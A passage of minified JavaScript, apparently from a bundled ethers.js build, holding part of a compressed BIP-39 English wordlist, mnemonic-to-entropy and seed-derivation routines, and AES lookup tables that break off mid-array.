E,]I{ItIzO>:Bb.Cco#CeCkD?DioIlInI'~yMpN^NdomN+PidReTeTh V&WZ%3AdyAlAs#BelBuildC$lCei=CipeC%dCyc!Du)F!@F%mFu'G]G*tGul?Je@LaxLea'LiefLyMa(Memb M(dMo=Nd NewNtOp&PairPeatPla)P%tQui*ScueSemb!Si,Sour)Sp#'SultTi*T*atTurnUn]Ve$ViewW?d2Y`m0BBb#CeChDeD+F!GhtGidNgOtPp!SkTu$V$V 5AdA,BotBu,CketM<)OfOkieOmSeTa>UghUndU>Y$5Bb DeGLeNNwayR$:DDd!D}[FeIlLadLm#L#LtLu>MeMp!NdTisfyToshiU)Usa+VeY1A!AnA*Att E}HemeHoolI&)I[%sOrp]OutRapRe&RiptRub1AAr^As#AtC#dC*tCt]Cur.yEdEkGm|Le@~M(?Ni%N'Nt&)RiesRvi)Ss]Tt!TupV&_dowAftAllowA*EdEllEriffIeldIftI}IpIv O{OeOotOpOrtOuld O=RimpRugUff!Y0Bl(gCkDeE+GhtGnL|Lk~yLv Mil?Mp!N)NgR&/ Tua>XZe1A>Et^IIllInIrtUll0AbAmEepEnd I)IdeIghtImOg<OtOwUsh0AllArtI!OkeOo`0A{AkeApIffOw0ApCc Ci$CkDaFtL?Ldi LidLut]L=Me#eNgOnRryRtUlUndUpUr)U`0A)A*Ati$AwnEakEci$EedEllEndH eI)Id IkeInIr.L.OilOns%O#OrtOtRayReadR(gY0Ua*UeezeUir*l_b!AdiumAffA+AirsAmpAndArtA>AyEakEelEmEpE*oI{IllIngO{Oma^O}OolOryO=Ra>gyReetRikeR#gRugg!Ud|UffUmb!Y!0Bje@Bm.BwayC)[ChDd&Ff G?G+,ItMm NNnyN'tP PplyP*meReRfa)R+Rpri'RroundR=ySpe@/a(1AllowAmpApArmE?EetIftImIngIt^Ord1MbolMptomRup/em:B!Ck!GIlL|LkNkPeR+tSk/eTtooXi3A^Am~NN<tNnisNtRm/Xt_nkAtEmeEnE%yE*EyIngIsOughtReeRi=RowUmbUnd 0CketDeG LtMb MeNyPRedSsueT!5A,BaccoDayDdl EGe` I!tK&MatoM%rowNeNgueNightOlO`PP-Pp!R^RnadoRtoi'SsT$Uri,W?dW WnY_{AdeAff-Ag-A(Ansf ApAshA=lAyEatEeEndI$IbeI{Igg ImIpOphyOub!U{UeUlyUmpetU,U`Y2BeIt]Mb!NaN}lRkeyRnRt!1El=EntyI)InI,O1PeP-$:5Ly5B*lla0Ab!Awa*C!Cov D DoFairFoldHappyIf%mIqueItIv 'KnownLo{TilUsu$Veil1Da>GradeHoldOnP Set1B<Ge0A+EEdEfulE![U$0Il.y:C<tCuumGueLidL!yL=NNishP%Rious/Ult3H-!L=tNd%Ntu*NueRbRifyRs]RyS'lT <3Ab!Br<tCiousCt%yDeoEw~a+Nta+Ol(Rtu$RusSaS.Su$T$Vid5C$I)IdLc<oLumeTeYa+:GeG#ItLk~LnutNtRfa*RmRri%ShSp/eT VeY3Al`Ap#ArA'lA` BDd(gEk&dIrdLcome/T_!AtEatEelEnE*IpIsp 0DeD`FeLd~NNdowNeNgNkNn Nt ReSdomSeShT}[5LfM<Nd OdOlRdRkRldRryR`_pE{E,!I,I>Ong::Rd3Ar~ow9UUngU`:3BraRo9NeO"
  , She = "0x3c8acc1e7b08d8e76f9fda015ef48dc8c710a73cb7e0f77b2c18a9b5a7adde60";
let j2 = null;
class Gc extends Phe {
    constructor() {
        super("en", Che, She)
    }
    static wordlist() {
        return j2 == null && (j2 = new Gc),
        j2
    }
}
function vF(r) {
    return (1 << r) - 1 << 8 - r & 255
}
function Bhe(r) {
    return (1 << r) - 1 & 255
}
function q2(r, e) {
    QD("NFKD"),
    e == null && (e = Gc.wordlist());
    const t = e.split(r);
    pe(t.length % 3 === 0 && t.length >= 12 && t.length <= 24, "invalid mnemonic length", "mnemonic", "[ REDACTED ]");
    const o = new Uint8Array(Math.ceil(11 * t.length / 8));
    let i = 0;
    for (let f = 0; f < t.length; f++) {
        let h = e.getWordIndex(t[f].normalize("NFKD"));
        pe(h >= 0, `invalid mnemonic word at index ${f}`, "mnemonic", "[ REDACTED ]");
        for (let p = 0; p < 11; p++)
            h & 1 << 10 - p && (o[i >> 3] |= 1 << 7 - i % 8),
            i++
    }
    const n = 32 * t.length / 3
      , s = t.length / 3
      , a = vF(s)
      , l = pt(no(o.slice(0, n / 8)))[0] & a;
    return pe(l === (o[o.length - 1] & a), "invalid mnemonic checksum", "mnemonic", "[ REDACTED ]"),
    et(o.slice(0, n / 8))
}
function V2(r, e) {
    pe(r.length % 4 === 0 && r.length >= 16 && r.length <= 32, "invalid entropy size", "entropy", "[ REDACTED ]"),
    e == null && (e = Gc.wordlist());
    const t = [0];
    let o = 11;
    for (let s = 0; s < r.length; s++)
        o > 8 ? (t[t.length - 1] <<= 8,
        t[t.length - 1] |= r[s],
        o -= 8) : (t[t.length - 1] <<= o,
        t[t.length - 1] |= r[s] >> 8 - o,
        t.push(r[s] & Bhe(8 - o)),
        o += 3);
    const i = r.length / 4
      , n = parseInt(no(r).substring(2, 4), 16) & vF(i);
    return t[t.length - 1] <<= i,
    t[t.length - 1] |= n >> 8 - i,
    e.join(t.map(s => e.getWord(s)))
}
const H2 = {};
class Kc {
    constructor(e, t, o, i, n) {
        we(this, "phrase");
        we(this, "password");
        we(this, "wordlist");
        we(this, "entropy");
        i == null && (i = ""),
        n == null && (n = Gc.wordlist()),
        el(e, H2, "Mnemonic"),
        tr(this, {
            phrase: o,
            password: i,
            wordlist: n,
            entropy: t
        })
    }
    computeSeed() {
        const e = Fo("mnemonic" + this.password, "NFKD");
        return _0(Fo(this.phrase, "NFKD"), e, 2048, 64, "sha512")
    }
    static fromPhrase(e, t, o) {
        const i = q2(e, o);
        return e = V2(pt(i), o),
        new Kc(H2,i,e,t,o)
    }
    static fromEntropy(e, t, o) {
        const i = pt(e, "entropy")
          , n = V2(i, o);
        return new Kc(H2,et(i),n,t,o)
    }
    static entropyToPhrase(e, t) {
        const o = pt(e, "entropy");
        return V2(o, t)
    }
    static phraseToEntropy(e, t) {
        return q2(e, t)
    }
    static isValidMnemonic(e, t) {
        try {
            return q2(e, t),
            !0
        } catch {}
        return !1
    }
}
/*! MIT License. Copyright 2015-2022 Richard Moore <me@ricmoo.com>. See LICENSE.txt. */
var kn = function(r, e, t, o) {
    if (t === "a" && !o)
        throw new TypeError("Private accessor was defined without a getter");
    if (typeof e == "function" ? r !== e || !o : !e.has(r))
        throw new TypeError("Cannot read private member from an object whose class did not declare it");
    return t === "m" ? o : t === "a" ? o.call(r) : o ? o.value : e.get(r)
}, G2 = function(r, e, t, o, i) {
    if (o === "m")
        throw new TypeError("Private method is not writable");
    if (o === "a" && !i)
        throw new TypeError("Private accessor was defined without a setter");
    if (typeof e == "function" ? r !== e || !i : !e.has(r))
        throw new TypeError("Cannot write private member to an object whose class did not declare it");
    return o === "a" ? i.call(r, t) : i ? i.value = t : e.set(r, t),
    t
}, Wm, _i, Ms;
const _he = {
    16: 10,
    24: 12,
    32: 14
}
  , Ihe = [1, 2, 4, 8, 16, 32, 64, 128, 27, 54, 108, 216, 171, 77, 154, 47, 94, 188, 99, 198, 151, 53, 106, 212, 179, 125, 250, 239, 197, 145]
  , Ai = [99, 124, 119, 123, 242, 107, 111, 197, 48, 1, 103, 43, 254, 215, 171, 118, 202, 130, 201, 125, 250, 89, 71, 240, 173, 212, 162, 175, 156, 164, 114, 192, 183, 253, 147, 38, 54, 63, 247, 204, 52, 165, 229, 241, 113, 216, 49, 21, 4, 199, 35, 195, 24, 150, 5, 154, 7, 18, 128, 226, 235, 39, 178, 117, 9, 131, 44, 26, 27, 110, 90, 160, 82, 59, 214, 179, 41, 227, 47, 132, 83, 209, 0, 237, 32, 252, 177, 91, 106, 203, 190, 57, 74, 76, 88, 207, 208, 239, 170, 251, 67, 77, 51, 133, 69, 249, 2, 127, 80, 60, 159, 168, 81, 163, 64, 143, 146, 157, 56, 245, 188, 182, 218, 33, 16, 255, 243, 210, 205, 12, 19, 236, 95, 151, 68, 23, 196, 167, 126, 61, 100, 93, 25, 115, 96, 129, 79, 220, 34, 42, 144, 136, 70, 238, 184, 20, 222, 94, 11, 219, 224, 50, 58, 10, 73, 6, 36, 92, 194, 211, 172, 98, 145, 149, 228, 121, 231, 200, 55, 109, 141, 213, 78, 169, 108, 86, 244, 234, 101, 122, 174, 8, 186, 120, 37, 46, 28, 166, 180, 198, 232, 221, 116, 31, 75, 189, 139, 138, 112, 62, 181, 102, 72, 3, 246, 14, 97, 53, 87, 185, 134, 193, 29, 158, 225, 248, 152, 17, 105, 217, 142, 148, 155, 30, 135, 233, 206, 85, 40, 223, 140, 161, 137, 13, 191, 230, 66, 104, 65, 153, 45, 15, 176, 84, 187, 22]
  , fm = [82, 9, 106, 213, 48, 54, 165, 56, 191, 64, 163, 158, 129, 243, 215, 251, 124, 227, 57, 130, 155, 47, 255, 135, 52, 142, 67, 68, 196, 222, 233, 203, 84, 123, 148, 50, 166, 194, 35, 61, 238, 76, 149, 11, 66, 250, 195, 78, 8, 46, 161, 102, 40, 217, 36, 178, 118, 91, 162, 73, 109, 139, 209, 37, 114, 248, 246, 100, 134, 104, 152, 22, 212, 164, 92, 204, 93, 101, 182, 146, 108, 112, 72, 80, 253, 237, 185, 218, 94, 21, 70, 87, 167, 141, 157, 132, 144, 216, 171, 0, 140, 188, 211, 10, 247, 228, 88, 5, 184, 179, 69, 6, 208, 44, 30, 143, 202, 63, 15, 2, 193, 175, 189, 3, 1, 19, 138, 107, 58, 145, 17, 65, 79, 103, 220, 234, 151, 242, 207, 206, 240, 180, 230, 115, 150, 172, 116, 34, 231, 173, 53, 133, 226, 249, 55, 232, 28, 117, 223, 110, 71, 241, 26, 113, 29, 41, 197, 137, 111, 183, 98, 14, 170, 24, 190, 27, 252, 86, 62, 75, 198, 210, 121, 32, 154, 219, 192, 254, 120, 205, 90, 244, 31, 221, 168, 51, 136, 7, 199, 49, 177, 18, 16, 89, 39, 128, 236, 95, 96, 81, 127, 169, 25, 181, 74, 13, 45, 229, 122, 159, 147, 201, 156, 239, 160, 224, 59, 77, 174, 42, 245, 176, 200, 235, 187, 60, 131, 83, 153, 97, 23, 43, 4, 126, 186, 119, 214, 38, 225, 105, 20, 99, 85, 33, 12, 125]
  , Ohe = [3328402341, 4168907908, 4000806809, 4135287693, 4294111757, 3597364157, 3731845041, 2445657428, 1613770832, 33620227, 3462883241, 1445669757, 3892248089, 3050821474, 1303096294, 3967186586, 2412431941, 528646813, 2311702848, 4202528135, 4026202645, 2992200171, 2387036105, 4226871307, 1101901292, 3017069671, 1604494077, 1169141738, 597466303, 1403299063, 3832705686, 2613100635, 1974974402, 3791519004, 1033081774, 1277568618, 1815492186, 2118074177, 4126668546, 2211236943, 1748251740, 1369810420, 3521504564, 4193382664, 3799085459, 2883115123, 1647391059, 706024767, 134480908, 2512897874, 1176707941, 2646852446, 806885416, 932615841, 168101135, 798661301, 235341577, 605164086, 461406363, 3756188221, 3454790438, 1311188841, 2142417613, 3933566367, 302582043, 495158174, 1479289972, 874125870, 907746093, 3698224818, 3025820398, 1537253627, 2756858614, 1983593293, 3084310113, 2108928974, 1378429307, 3722699582, 1580150641, 327451799, 2790478837, 3117535592, 0, 3253595436, 1075847264, 3825007647, 2041688520, 3059440621, 3563743934, 2378943302, 1740553945, 1916352843, 2487896798, 2555137236, 2958579944, 2244988746, 3151024235, 3320835882, 1336584933, 3992714006, 2252555205, 2588757463, 1714631509, 293963156, 2319795663, 3925473552, 67240454, 4269768577, 2689618160, 2017213508, 631218106, 1269344483, 2723238387, 1571005438, 2151694528, 93294474, 1066570413, 563977660, 1882732616, 4059428100, 1673313503, 2008463041, 2950355573, 1109467491, 537923632, 3858759450, 4260623118, 3218264685, 2177748300, 403442708, 638784309, 3287084079, 3193921505, 899127202, 2286175436, 773265209, 2479146071, 1437050866, 4236148354, 2050833735, 3362022572, 3126681063, 840505643, 3866325909, 3227541664, 427917720, 2655997905, 2749160575, 1143087718, 1412049534, 999329963, 193497219, 2353415882, 3354324521, 1807268051, 672404540, 2816401017, 3160301282, 369822493, 2916866934, 3688947771, 1681011286, 1949973070, 336202270, 2454276571, 201721354, 1210328172, 3093060836, 2680341085, 3184776046, 1135389935, 3294782118, 965841320, 831886756, 3554993207, 4068047243, 3588745010, 2345191491, 1849112409, 3664604599, 26054028, 2983581028, 2622377682, 1235855840, 3630984372, 2891339514, 4092916743, 3488279077, 3395642799, 4101667470, 1202630377, 268961816, 1874508501, 4034427016, 1243948399, 1546530418, 941366308, 1470539505, 1941222599, 2546386513, 3421038627, 2715671932, 3899946140, 1042226977, 2521517021, 1639824860, 227249030, 260737669, 3765465232, 2084453954, 1907733956, 3429263018, 2420656344, 100860677, 4160157185, 470683154, 3261161891, 1781871967, 2924959737, 1773779408, 394692241, 2579611992, 974986535, 664706745, 3655459128, 3958962195, 731420851, 571543859, 3530123707, 2849626480, 126783113, 865375399, 765172662, 1008606754, 361203602, 3387549984, 2278477385, 2857719295, 1344809080, 2782912378, 59542671, 1503764984, 160008576, 437062935, 1707065306, 3622233649, 2218934982, 3496503480, 2185314755, 697932208, 1512910199, 504303377, 2075177163, 2824099068, 1841019862, 739644986]
  , Rhe = [2781242211, 2230877308, 2582542199, 2381740923, 234877682, 3184946027, 2984144751, 1418839493, 1348481072, 50462977, 2848876391, 2102799147, 434634494, 1656084439, 3863849899, 2599188086, 1167051466, 2636087938, 1082771913, 2281340285, 368048890, 3954334041, 3381544775, 201060592, 3963727277, 1739838676, 4250903202, 3930435503, 3206782108, 4149453988, 2531553906, 1536934080, 3262494647, 484572669, 2923271059, 1783375398, 1517041206, 1098792767, 49674231, 1334037708, 1550332980, 4098991525, 886171109, 150598129, 2481090929, 1940642008, 1398944049, 1059722517, 201851908, 1385547719, 1699095331, 1587397571, 674240536, 2704774806, 252314885, 3039795866, 151914247, 908333586, 2602270848, 1038082786, 651029483, 1766729511, 3447698098, 2682942837, 454166793, 2652734339, 1951935532, 775166490, 758520603, 3000790638, 4004797018, 4217086112, 4137964114, 1299594043, 1639438038, 3464344499, 2068982057, 1054729187, 1901997871, 2534638724, 4121318227, 1757008337, 0, 750906861, 1614815264, 535035132, 3363418545, 3988151131, 3201591914, 1183697867, 3647454910, 1265776953, 3734260298, 3566750796, 3903871064, 1250283471, 1807470800, 717615087, 3847203498, 384695291, 3313910595, 3617213773, 1432761139, 2484176261, 3481945413, 283769337, 100925954, 2180939647, 4037038160, 1148730428, 3123027871, 3813386408, 4087501137, 4267549603, 3229630528, 2315620239, 2906624658, 3156319645, 1215313976, 82966005, 3747855548, 3245848246, 1974459098, 1665278241, 807407632, 451280895, 251524083, 1841287890, 1283575245, 337120268, 891687699, 801369324, 3787349855, 2721421207, 3431482436, 959321879, 1469301956, 4065699751, 2197585534, 1199193405, 2898814052, 3887750493, 724703513, 2514908019, 2696962144, 2551808385, 3516813135, 2141445340, 1715741218, 2119445034, 2872807568, 2198571144, 3398190662, 700968686, 3547052216, 1009259540, 2041044702, 3803995742, 487983883, 1991105499, 1004265696, 1449407026, 1316239930, 504629770, 3683797321, 168560134, 1816667172, 3837287516, 1570751170, 1857934291, 4014189740, 2797888098, 2822345105, 2754712981, 936633572, 2347923833, 852879335, 1133234376, 1500395319, 3084545389, 2348912013, 1689376213, 3533459022, 3762923945, 3034082412, 4205598294, 133428468, 634383082, 2949277029, 2398386810, 3913789102, 403703816, 3580869306, 2297460856, 1867130149, 1918643758, 607656988, 4049053350, 3346248884, 1368901318, 600565992, 2090982877, 2632479860, 557719327, 3717614411, 3697393085, 2249034635, 2232388234, 2430627952, 1115438654, 3295786421, 2865522278, 3633334344, 84280067, 33027830, 303828494, 2747425121, 1600795957, 4188952407, 3496589753, 2434238086, 1486471617, 658119965, 3106381470, 953803233, 334231800, 3005978776, 857870609, 3151128937, 1890179545, 2298973838, 2805175444, 3056442267, 574365214, 2450884487, 550103529, 1233637070, 4289353045, 2018519080, 2057691103, 2399374476, 4166623649, 2148108681, 387583245, 3664101311, 836232934, 3330556482, 3100665960, 3280093505, 2955516313, 2002398509, 287182607, 3413881008, 4238890068, 3597515707, 975967766]
  , Whe = [1671808611, 2089089148, 2006576759, 2072901243, 4061003762, 1807603307, 1873927791, 3310653893, 810573872, 16974337, 1739181671, 729634347, 4263110654, 3613570519, 2883997099, 1989864566, 3393556426, 2191335298, 3376449993, 2106063485, 4195741690, 1508618841, 1204391495, 4027317232, 2917941677, 3563566036, 2734514082, 2951366063, 2629772188, 2767672228, 1922491506, 3227229120, 3082974647, 4246528509, 2477669779, 644500518, 911895606, 1061256767, 4144166391, 3427763148, 878471220, 2784252325, 3845444069, 4043897329, 1905517169, 3631459288, 827548209, 356461077, 67897348, 3344078279, 593839651, 3277757891, 405286936, 2527147926, 84871685, 2595565466, 118033927, 305538066, 2157648768, 3795705826, 3945188843, 661212711, 2999812018, 1973414517, 152769033, 2208177539, 745822252, 439235610, 455947803, 1857215598, 1525593178, 2700827552, 1391895634, 994932283, 3596728278, 3016654259, 695947817, 3812548067, 795958831, 2224493444, 1408607827, 3513301457, 0, 3979133421, 543178784, 4229948412, 2982705585, 1542305371, 1790891114, 3410398667, 3201918910, 961245753, 1256100938, 1289001036, 1491644504, 3477767631, 3496721360, 4012557807, 2867154858, 4212583931, 1137018435, 1305975373, 861234739, 2241073541, 1171229253, 4178635257, 33948674, 2139225727, 1357946960, 1011120188, 2679776671, 2833468328, 1374921297, 2751356323, 1086357568, 2408187279, 2460827538, 2646352285, 944271416, 4110742005, 3168756668, 3066132406, 3665145818, 560153121, 271589392, 4279952895, 4077846003, 3530407890, 3444343245, 202643468, 322250259, 3962553324, 1608629855, 2543990167, 1154254916, 389623319, 3294073796, 2817676711, 2122513534, 1028094525, 1689045092, 1575467613, 422261273, 1939203699, 1621147744, 2174228865, 1339137615, 3699352540, 577127458, 712922154, 2427141008, 2290289544, 1187679302, 3995715566, 3100863416, 339486740, 3732514782, 1591917662, 186455563, 3681988059, 3762019296, 844522546, 978220090, 169743370, 1239126601, 101321734, 611076132, 1558493276, 3260915650, 3547250131, 2901361580, 1655096418, 2443721105, 2510565781, 3828863972, 2039214713, 3878868455, 3359869896, 928607799, 1840765549, 2374762893, 3580146133, 1322425422, 2850048425, 1823791212, 1459268694, 4094161908, 3928346602, 1706019429, 2056189050, 2934523822, 135794696, 3134549946, 2022240376, 628050469, 779246638, 472135708, 2800834470, 3032970164, 3327236038, 3894660072, 3715932637, 1956440180, 522272287, 1272813131, 3185336765, 2340818315, 2323976074, 1888542832, 1044544574, 3049550261, 1722469478, 1222152264, 50660867, 4127324150, 236067854, 1638122081, 895445557, 1475980887, 3117443513, 2257655686, 3243809217, 489110045, 2662934430, 3778599393, 4162055160, 2561878936, 288563729, 1773916777, 3648039385, 2391345038, 2493985684, 2612407707, 505560094, 2274497927, 3911240169, 3460925390, 1442818645, 678973480, 3749357023, 2358182796, 2717407649, 2306869641, 219617805, 3218761151, 3862026214, 1120306242, 1756942440, 1103331905, 2578459033, 762796589, 252780047, 2966125488, 1425844308, 3151392187, 372911126]
  , Mhe = [1667474886, 2088535288, 2004326894, 2071694838, 4075949567, 1802223062, 1869591006, 3318043793, 808472672, 16843522, 1734846926, 724270422, 4278065639, 3621216949, 2880169549, 1987484396, 3402253711, 2189597983, 3385409673, 2105378810, 4210693615, 1499065266, 1195886990, 4042263547, 2913856577, 3570689971, 2728590687, 2947541573, 2627518243, 2762274643, 1920112356, 3233831835, 3082273397, 4261223649, 2475929149, 640051788, 909531756, 1061110142, 4160160501, 3435941763, 875846760, 2779116625, 3857003729, 4059105529, 1903268834, 3638064043, 825316194, 353713962, 67374088, 3351728789, 589522246, 3284360861, 404236336, 2526454071, 84217610, 2593830191, 117901582, 303183396, 2155911963, 3806477791, 3958056653, 656894286, 2998062463, 1970642922, 151591698, 2206440989, 741110872, 437923380, 454765878, 1852748508, 1515908788, 2694904667, 1381168804, 993742198, 3604373943, 3014905469, 690584402, 3823320797, 791638366, 2223281939, 1398011302, 3520161977, 0, 3991743681, 538992704, 4244381667, 2981218425, 1532751286, 1785380564, 3419096717, 3200178535, 960056178, 1246420628, 1280103576, 1482221744, 3486468741, 3503319995, 4025428677, 2863326543, 4227536621, 1128514950, 1296947098, 859002214, 2240123921, 1162203018, 4193849577, 33687044, 2139062782, 1347481760, 1010582648, 2678045221, 2829640523, 1364325282, 2745433693, 1077985408, 2408548869, 2459086143, 2644360225, 943212656, 4126475505, 3166494563, 3065430391, 3671750063, 555836226, 269496352, 4294908645, 4092792573, 3537006015, 3452783745, 202118168, 320025894, 3974901699, 1600119230, 2543297077, 1145359496, 387397934, 3301201811, 2812801621, 2122220284, 1027426170, 1684319432, 1566435258, 421079858, 1936954854, 1616945344, 2172753945, 1330631070, 3705438115, 572679748, 707427924, 2425400123, 2290647819, 1179044492, 4008585671, 3099120491, 336870440, 3739122087, 1583276732, 185277718, 3688593069, 3772791771, 842159716, 976899700, 168435220, 1229577106, 101059084, 606366792, 1549591736, 3267517855, 3553849021, 2897014595, 1650632388, 2442242105, 2509612081, 3840161747, 2038008818, 3890688725, 3368567691, 926374254, 1835907034, 2374863873, 3587531953, 1313788572, 2846482505, 1819063512, 1448540844, 4109633523, 3941213647, 1701162954, 2054852340, 2930698567, 134748176, 3132806511, 2021165296, 623210314, 774795868, 471606328, 2795958615, 3031746419, 3334885783, 3907527627, 3722280097, 1953799400, 522133822, 1263263126, 3183336545, 2341176845, 2324333839, 1886425312, 1044267644, 3048588401, 1718004428, 1212733584, 50529542, 4143317495, 235803164, 1633788866, 892690282, 1465383342, 3115962473, 2256965911, 3250673817, 488449850, 2661202215, 3789633753, 4177007595, 2560144171, 286339874, 1768537042, 3654906025, 2391705863, 2492770099, 2610673197, 505291324, 2273808917, 3924369609, 3469625735, 1431699370, 673740880, 3755965093, 2358021891, 2711746649, 2307489801, 218961690, 3217021541, 3873845719, 1111672452, 1751693520, 1094828930, 2576986153, 757954394, 252645662, 2964376443, 1414855848, 3149649517, 370555436]
  , Nhe = [1374988112, 2118214995, 437757123, 975658646, 1001089995, 530400753, 2902087851, 1273168787, 540080725, 2910219766, 2295101073, 4110568485, 1340463100, 3307916247, 641025152, 3043140495, 3736164937, 632953703, 1172967064, 1576976609, 3274667266, 2169303058, 2370213795, 1809054150, 59727847, 361929877, 3211623147, 2505202138, 3569255213, 1484005843, 1239443753, 2395588676, 1975683434, 4102977912, 2572697195, 666464733, 3202437046, 4035489047, 3374361702, 2110667444, 1675577880, 3843699074, 2538681184, 1649639237, 2976151520, 3144396420, 4269907996, 4178062228, 1883793496, 2403728665, 2497604743, 1383856311, 2876494627, 1917518562, 3810496343, 1716890410, 3001755655, 800440835, 2261089178, 3543599269, 807962610, 599762354, 33778362, 3977675356, 2328828971, 2809771154, 4077384432, 1315562145, 1708848333, 101039829, 3509871135, 3299278474, 875451293, 2733856160, 92987698, 2767645557, 193195065, 1080094634, 1584504582, 3178106961, 1042385657, 2531067453, 3711829422, 1306967366, 2438237621, 1908694277, 67556463, 1615861247, 429456164, 3602770327, 2302690252, 1742315127, 2968011453, 126454664, 3877198648, 2043211483, 2709260871, 2084704233, 4169408201, 0, 159417987, 841739592, 504459436, 1817866830, 4245618683, 260388950, 1034867998, 908933415, 168810852, 1750902305, 2606453969, 607530554, 202008497, 2472011535, 3035535058, 463180190, 2160117071, 1641816226, 1517767529, 470948374, 3801332234, 3231722213, 1008918595, 303765277, 235474187, 4069246893, 766945465, 337553864, 1475418501, 2943682380, 4003061179, 2743034109, 4144047775, 1551037884, 1147550661, 1543208500, 2336434550, 3408119516, 3069049960, 3102011747, 3610369226, 1113818384, 328671808, 2227573024, 2236228733, 3535486456, 2935566865, 3341394285, 496906059, 3702665459, 226906860, 2009195472, 733156972, 2842737049, 294930682, 1206477858, 2835123396, 2700099354, 1451044056, 573804783, 2269728455, 3644379585, 2362090238, 2564033334, 2801107407, 2776292904, 3669462566, 1068351396, 742039012, 1350078989, 1784663195, 1417561698, 4136440770, 2430122216, 775550814, 2193862645, 2673705150, 1775276924, 1876241833, 3475313331, 3366754619, 270040487, 3902563182, 3678124923, 3441850377, 1851332852, 3969562369, 2203032232, 3868552805, 2868897406, 566021896, 4011190502, 3135740889, 1248802510, 3936291284, 699432150, 832877231, 708780849, 3332740144, 899835584, 1951317047, 4236429990, 3767586992, 866637845, 4043610186, 1106041591, 2144161806, 395441711, 1984812685, 1139781709, 3433712980, 3835036895, 2664543715, 1282050075, 3240894392, 1181045119, 2640243204, 25965917, 4203181171, 4211818798, 3009879386, 2463879762, 3910161971, 1842759443, 2597806476, 933301370, 1509430414, 3943906441, 3467192302, 3076639029, 3776767469, 2051518780, 2631065433, 1441952575, 404016761, 1942435775, 1408749034, 1610459739, 3745345300, 2017778566, 3400528769, 3110650942, 941896748, 3265478751, 371049330, 3168937228, 675039627, 4279080257, 967311729, 135050206, 3635733660, 1683407248, 2076935265, 3576870512, 1215061108, 3501741890]
  , Dhe = [1347548327, 1400783205, 3273267108, 2520393566, 3409685355, 4045380933, 2880240216, 2471224067, 1428173050, 4138563181, 2441661558, 636813900, 4233094615, 3620022987, 2149987652, 2411029155, 1239331162, 1730525723, 2554718734, 3781033664, 46346101, 310463728, 2743944855, 3328955385, 3875770207, 2501218972, 3955191162, 3667219033, 768917123, 3545789473, 692707433, 1150208456, 1786102409, 2029293177, 1805211710, 3710368113, 3065962831, 401639597, 1724457132, 3028143674, 409198410, 2196052529, 1620529459, 1164071807, 3769721975, 2226875310, 486441376, 2499348523, 1483753576, 428819965, 2274680428, 3075636216, 598438867, 3799141122, 1474502543, 711349675, 129166120, 53458370, 2592523643, 2782082824, 4063242375, 2988687269, 3120694122, 1559041666, 730517276, 2460449204, 4042459122, 2706270690, 3446004468, 3573941694, 533804130, 2328143614, 2637442643, 2695033685, 839224033, 1973745387, 957055980, 2856345839, 106852767, 1371368976, 4181598602, 1033297158, 2933734917, 1179510461, 3046200461, 91341917, 1862534868, 4284502037, 605657339, 2547432937, 3431546947, 2003294622, 3182487618, 2282195339, 954669403, 3682191598, 1201765386, 3917234703, 3388507166, 0, 2198438022, 1211247597, 2887651696, 1315723890, 4227665663, 1443857720, 507358933, 657861945, 1678381017, 560487590, 3516619604, 975451694, 2970356327, 261314535, 3535072918, 2652609425, 1333838021, 2724322336, 1767536459, 370938394, 182621114, 3854606378, 1128014560, 487725847, 185469197, 2918353863, 3106780840, 3356761769, 2237133081, 1286567175, 3152976349, 4255350624, 2683765030, 3160175349, 3309594171, 878443390, 1988838185, 3704300486, 1756818940, 1673061617, 3403100636, 272786309, 1075025698, 545572369, 2105887268, 4174560061, 296679730, 1841768865, 1260232239, 4091327024, 3960309330, 3497509347, 1814803222, 2578018489, 4195456072, 575138148, 3299409036, 446754879, 3629546796, 4011996048, 3347532110, 3252238545, 4270639778, 915985419, 3483825537, 681933534, 651868046, 2755636671, 3828103837, 223377554, 2607439820, 1649704518, 3270937875, 3901806776, 1580087799, 4118987695, 3198115200, 2087309459, 2842678573, 3016697106, 1003007129, 2802849917, 1860738147, 2077965243, 164439672, 4100872472, 32283319, 2827177882, 1709610350, 2125135846, 136428751, 3874428392, 3652904859, 3460984630, 3572145929, 3593056380, 2939266226, 824852259, 818324884, 3224740454, 930369212, 2801566410, 2967507152, 355706840, 1257309336, 4148292826, 243256656, 790073846, 2373340630, 1296297904, 1422699085, 3756299780, 3818836405, 457992840, 3099667487, 2135319889, 77422314, 1560382517, 1945798516, 788204353, 1521706781, 1385356242, 870912086, 325965383, 2358957921, 2050466060, 2388260884, 2313884476, 4006521127, 901210569, 3990953189, 1014646705, 1503449823, 1062597235, 2031621326, 3212035895, 3931371469, 1533017514, 350174575, 2256028891, 2177544179, 1052338372, 741876788, 1606591296, 1914052035, 213705253, 2334669897, 1107234197, 1899603969, 3725069491, 2631447780, 2422494913, 1635502980, 1893020342, 1950903388, 1120974935]
  , Fhe = [2807058932, 1699970625, 2764249623, 1586903591, 1808481195, 1173430173, 1487645946, 59984867, 4199882800, 1844882806, 1989249228, 1277555970, 3623636965, 3419915562, 1149249077, 2744104290, 1514790577, 459744698, 244860394, 3235995134, 1963115311, 4027744588, 2544078150, 4190530515, 1608975247, 2627016082, 2062270317, 1507497298, 2200818878, 567498868, 1764313568, 3359936201, 2305455554, 2037970062, 1047239e3, 1910319033, 1337376481, 2904027272, 2892417312, 984907214, 1243112415, 830661914, 861968209, 2135253587, 2011214180, 2927934315, 2686254721, 731183368, 1750626376, 4246310725, 1820824798, 4172763771, 3542330227, 48394827, 2404901663, 2871682645, 671593195, 3254988725, 2073724613, 145085239, 2280796200, 2779915199, 1790575107, 2187128086, 472615631, 3029510009, 4075877127, 3802222185, 4107101658, 3201631749, 1646252340, 4270507174, 1402811438, 1436590835, 3778151818, 3950355702, 3963161475, 4020912224, 2667994737, 273792366, 2331590177, 104699613, 95345982, 3175501286, 2377486676, 1560637892, 3564045318, 369057872, 4213447064, 3919042237, 1137477952, 2658625497, 1119727848, 2340947849, 1530455833, 4007360968, 172466556, 266959938, 516552836, 0, 2256734592, 3980931627, 1890328081, 1917742170, 4294704398, 945164165, 3575528878, 958871085, 3647212047, 2787207260, 1423022939, 775562294, 1739656202, 3876557655, 2530391278, 2443058075, 3310321856, 547512796, 1265195639, 437656594, 3121275539, 719700128, 3762502690, 387781147, 218828297, 3350065803, 2830708150, 2848461854, 428169201, 122466165, 3720081049, 1627235199, 648017665, 4122762354, 1002783846, 2117360635, 695634755, 3336358691, 4234721005, 4049844452, 3704280881, 2232435299, 574624663, 287343814, 612205898, 1039717051, 840019705, 2708326185, 793451934, 821288114, 1391201670, 3822090177, 376187827, 3113855344, 1224348052, 1679968233, 